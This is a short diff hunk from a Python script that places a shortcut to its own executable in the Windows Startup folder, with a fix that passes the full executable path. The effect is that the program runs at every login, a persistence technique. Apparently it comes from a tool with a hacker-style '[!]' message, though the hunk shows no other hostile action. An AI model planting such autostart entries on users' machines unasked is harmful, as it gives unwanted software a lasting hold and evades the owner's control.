@@ -20,7 +20,7 @@ current_file_path = sys.executable
 current_file = os.path.basename(current_file_path)  # Absolute path of the current script/exe
 shortcut_file = os.path.join(home_path, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", current_file.replace(".exe", ".lnk").replace(".py", ".lnk"))
 try:
-    create_shortcut(current_file, shortcut_file, description="My Shortcut")
+    create_shortcut(current_file_path, shortcut_file, description="My Shortcut")
 except Exception as e:
     print(f"[!] Failed to create shortcut: {e}")
 
